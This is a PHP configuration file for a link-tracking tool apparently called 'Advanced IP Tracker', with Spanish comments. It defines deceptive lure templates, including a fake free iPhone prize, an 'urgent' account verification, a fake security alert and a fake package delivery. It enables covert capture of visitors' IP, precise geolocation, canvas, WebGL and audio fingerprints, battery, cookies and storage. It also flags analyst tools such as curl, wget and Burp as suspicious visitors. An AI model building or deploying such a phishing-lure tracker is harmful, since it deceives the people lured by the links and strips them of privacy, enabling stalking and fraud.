<?php
/**
 * Advanced IP Tracker - Archivo de Configuración
 * Configuraciones centralizadas del sistema
 */

// Configuración de la base de datos (opcional para futuras expansiones)
define('DB_HOST', 'localhost');
define('DB_NAME', 'ip_tracker');
define('DB_USER', 'root');
define('DB_PASS', '');

// Configuración de directorios
define('ROOT_DIR', dirname(__DIR__));
define('DATA_DIR', ROOT_DIR . '/data/');
define('LOGS_DIR', ROOT_DIR . '/logs/');
define('LINKS_DIR', DATA_DIR . 'links/');
define('CAPTURES_DIR', DATA_DIR . 'captures/');
define('ADMIN_DIR', ROOT_DIR . '/admin/');
define('FRONTEND_DIR', ROOT_DIR . '/frontend/');
define('BACKEND_DIR', ROOT_DIR . '/backend/');

// Configuración de URLs
define('BASE_URL', 'http://localhost/advanced-ip-tracker/');
define('TRACK_URL', BASE_URL . 'frontend/track.php');
define('ADMIN_URL', BASE_URL . 'admin/');
define('API_URL', BASE_URL . 'backend/');

// Configuración de seguridad
define('ADMIN_PASSWORD', 'admin123'); // Cambiar en producción
define('SESSION_TIMEOUT', 3600); // 1 hora
define('MAX_FILE_SIZE', 10485760); // 10MB
define('ALLOWED_IPS', ['127.0.0.1', '::1']); // IPs permitidas para admin

// Configuración de APIs externas
define('IP_API_URL', 'http://ip-api.com/json/');
define('IP_API_FIELDS', 'status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query');

// Configuración de logging
define('LOG_LEVEL', 'INFO'); // DEBUG, INFO, WARNING, ERROR
define('LOG_MAX_SIZE', 5242880); // 5MB
define('LOG_RETENTION_DAYS', 30);

// Configuración de captura de datos
define('CAPTURE_GEOLOCATION', true);
define('CAPTURE_FINGERPRINTING', true);
define('CAPTURE_BATTERY_INFO', true);
define('CAPTURE_NETWORK_INFO', true);
define('CAPTURE_DEVICE_INFO', true);

// Configuración de redirección
define('DEFAULT_REDIRECT_URL', 'https://www.google.com');
define('REDIRECT_DELAY', 3); // segundos

// Configuración de notificaciones
define('ENABLE_EMAIL_NOTIFICATIONS', false);
define('NOTIFICATION_EMAIL', 'admin@example.com');
define('SMTP_HOST', 'smtp.gmail.com');
define('SMTP_PORT', 587);
define('SMTP_USER', '');
define('SMTP_PASS', '');

// Configuración de limpieza automática
define('AUTO_CLEANUP_ENABLED', true);
define('CLEANUP_OLDER_THAN_DAYS', 90);
define('MAX_CAPTURES_PER_IP', 100);

// Configuración de rate limiting
define('RATE_LIMIT_ENABLED', true);
define('MAX_REQUESTS_PER_MINUTE', 60);
define('MAX_REQUESTS_PER_HOUR', 1000);

// Configuración de user agents sospechosos
$SUSPICIOUS_USER_AGENTS = [
    'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java',
    'postman', 'insomnia', 'httpie', 'fiddler', 'burp'
];

// Configuración de IPs bloqueadas
$BLOCKED_IPS = [
    // Agregar IPs que se deseen bloquear
];

// Configuración de países bloqueados (códigos ISO)
$BLOCKED_COUNTRIES = [
    // Ejemplo: 'CN', 'RU', 'KP'
];

// Configuración de templates de enlaces
$LINK_TEMPLATES = [
    'prize' => [
        'name' => 'Premio/Sorteo',
        'message' => '¡Felicidades! Has ganado un premio',
        'prize' => 'iPhone 15 Pro GRATIS',
        'redirect' => 'https://www.apple.com/iphone-15-pro/',
        'icon' => '🎁'
    ],
    'urgent' => [
        'name' => 'Mensaje Urgente',
        'message' => '¡URGENTE! Acción requerida',
        'prize' => 'Verificación de cuenta necesaria',
        'redirect' => 'https://www.google.com/search?q=phishing+awareness',
        'icon' => '⚠️'
    ],
    'social' => [
        'name' => 'Red Social',
        'message' => 'Alguien mencionó tu nombre',
        'prize' => 'Ver quién te mencionó',
        'redirect' => 'https://www.facebook.com',
        'icon' => '👥'
    ],
    'work' => [
        'name' => 'Trabajo/Profesional',
        'message' => 'Documento importante compartido',
        'prize' => 'Acceder al documento',
        'redirect' => 'https://docs.google.com',
        'icon' => '📄'
    ],
    'delivery' => [
        'name' => 'Entrega/Paquete',
        'message' => 'Tu paquete está en camino',
        'prize' => 'Rastrear envío',
        'redirect' => 'https://www.ups.com/track',
        'icon' => '📦'
    ],
    'security' => [
        'name' => 'Alerta de Seguridad',
        'message' => 'Actividad sospechosa detectada',
        'prize' => 'Verificar cuenta ahora',
        'redirect' => 'https://haveibeenpwned.com',
        'icon' => '🔒'
    ]
];

// Configuración de campos de captura
$CAPTURE_FIELDS = [
    'basic' => [
        'ip', 'user_agent', 'timestamp', 'referrer', 'current_url'
    ],
    'device' => [
        'screen_resolution', 'window_size', 'color_depth', 'pixel_depth',
        'platform', 'language', 'languages', 'timezone', 'timezone_offset'
    ],
    'network' => [
        'connection_type', 'connection_downlink', 'connection_rtt',
        'online_status', 'do_not_track'
    ],
    'hardware' => [
        'hardware_concurrency', 'device_memory', 'battery_info'
    ],
    'fingerprinting' => [
        'canvas_fingerprint', 'webgl_fingerprint', 'audio_fingerprint',
        'fonts_detected', 'plugins_installed'
    ],
    'storage' => [
        'local_storage', 'session_storage', 'cookies', 'indexed_db'
    ],
    'geolocation' => [
        'latitude', 'longitude', 'accuracy', 'altitude', 'heading', 'speed'
    ]
];

// Función para obtener configuración
function getConfig($key, $default = null) {
    return defined($key) ? constant($key) : $default;
}

// Función para verificar si una funcionalidad está habilitada
function isFeatureEnabled($feature) {
    switch ($feature) {
        case 'geolocation':
            return CAPTURE_GEOLOCATION;
        case 'fingerprinting':
            return CAPTURE_FINGERPRINTING;
        case 'battery':
            return CAPTURE_BATTERY_INFO;
        case 'network':
            return CAPTURE_NETWORK_INFO;
        case 'device':
            return CAPTURE_DEVICE_INFO;
        case 'email_notifications':
            return ENABLE_EMAIL_NOTIFICATIONS;
        case 'auto_cleanup':
            return AUTO_CLEANUP_ENABLED;
        case 'rate_limit':
            return RATE_LIMIT_ENABLED;
        default:
            return false;
    }
}

// Función para obtener templates de enlaces
function getLinkTemplates() {
    global $LINK_TEMPLATES;
    return $LINK_TEMPLATES;
}

// Función para obtener campos de captura
function getCaptureFields($category = null) {
    global $CAPTURE_FIELDS;
    
    if ($category && isset($CAPTURE_FIELDS[$category])) {
        return $CAPTURE_FIELDS[$category];
    }
    
    return $CAPTURE_FIELDS;
}

// Función para verificar si una IP está bloqueada
function isIPBlocked($ip) {
    global $BLOCKED_IPS;
    return in_array($ip, $BLOCKED_IPS);
}

// Función para verificar si un país está bloqueado
function isCountryBlocked($countryCode) {
    global $BLOCKED_COUNTRIES;
    return in_array($countryCode, $BLOCKED_COUNTRIES);
}

// Función para verificar si un user agent es sospechoso
function isSuspiciousUserAgent($userAgent) {
    global $SUSPICIOUS_USER_AGENTS;
    $userAgent = strtolower($userAgent);
    
    foreach ($SUSPICIOUS_USER_AGENTS as $suspicious) {
        if (strpos($userAgent, $suspicious) !== false) {
            return true;
        }
    }
    
    return false;
}

// Función para crear directorios necesarios
function createRequiredDirectories() {
    $directories = [
        DATA_DIR,
        LOGS_DIR,
        LINKS_DIR,
        CAPTURES_DIR
    ];
    
    foreach ($directories as $dir) {
        if (!file_exists($dir)) {
            mkdir($dir, 0755, true);
        }
    }
}

// Función para limpiar archivos antiguos
function cleanupOldFiles() {
    if (!AUTO_CLEANUP_ENABLED) {
        return false;
    }
    
    $cutoffTime = time() - (CLEANUP_OLDER_THAN_DAYS * 24 * 60 * 60);
    $cleaned = 0;
    
    // Limpiar capturas antiguas
    $capturesDir = CAPTURES_DIR;
    if (is_dir($capturesDir)) {
        $files = glob($capturesDir . '*.json');
        foreach ($files as $file) {
            if (filemtime($file) < $cutoffTime) {
                unlink($file);
                $cleaned++;
            }
        }
    }
    
    // Limpiar logs antiguos
    $logsDir = LOGS_DIR;
    if (is_dir($logsDir)) {
        $files = glob($logsDir . '*.log');
        foreach ($files as $file) {
            if (filemtime($file) < $cutoffTime) {
                unlink($file);
                $cleaned++;
            }
        }
    }
    
    return $cleaned;
}

// Función para verificar rate limiting
function checkRateLimit($ip) {
    if (!RATE_LIMIT_ENABLED) {
        return true;
    }
    
    $rateLimitFile = LOGS_DIR . 'rate_limit_' . md5($ip) . '.json';
    $now = time();
    
    if (file_exists($rateLimitFile)) {
        $data = json_decode(file_get_contents($rateLimitFile), true);
        
        // Limpiar entradas antiguas
        $data['requests'] = array_filter($data['requests'], function($timestamp) use ($now) {
            return ($now - $timestamp) < 3600; // Mantener solo la última hora
        });
        
        // Verificar límites
        $requestsLastMinute = count(array_filter($data['requests'], function($timestamp) use ($now) {
            return ($now - $timestamp) < 60;
        }));
        
        $requestsLastHour = count($data['requests']);
        
        if ($requestsLastMinute >= MAX_REQUESTS_PER_MINUTE || $requestsLastHour >= MAX_REQUESTS_PER_HOUR) {
            return false;
        }
    } else {
        $data = ['requests' => []];
    }
    
    // Agregar nueva solicitud
    $data['requests'][] = $now;
    file_put_contents($rateLimitFile, json_encode($data));
    
    return true;
}

// Inicializar directorios al cargar el archivo
createRequiredDirectories();

?>